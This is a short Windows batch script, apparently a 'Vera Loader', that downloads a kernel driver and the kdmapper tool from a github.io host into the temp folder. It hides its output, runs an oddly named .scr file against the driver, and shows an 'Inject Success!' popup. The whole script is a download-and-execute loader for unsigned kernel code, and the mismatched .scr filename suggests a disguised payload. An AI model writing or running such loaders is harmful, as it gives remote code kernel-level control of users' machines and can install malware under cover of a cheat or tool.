@echo off
cd %temp%
curl -o driver.sys https://getserver.github.io/api/keysys/driver.sys
cls
curl -o injecti.exe https://getserver.github.io/api/keysys/kdmapper_Release.exe
cls

"injbs56789acerb6v1.scr" "driver.sys"

set VBScriptFile=temp.vbs

(
  echo MsgBox "Inject Success!", vbInformation, "Vera Loader"
) > %VBScriptFile%

cscript //nologo %VBScriptFile%
del %VBScriptFile%
exit

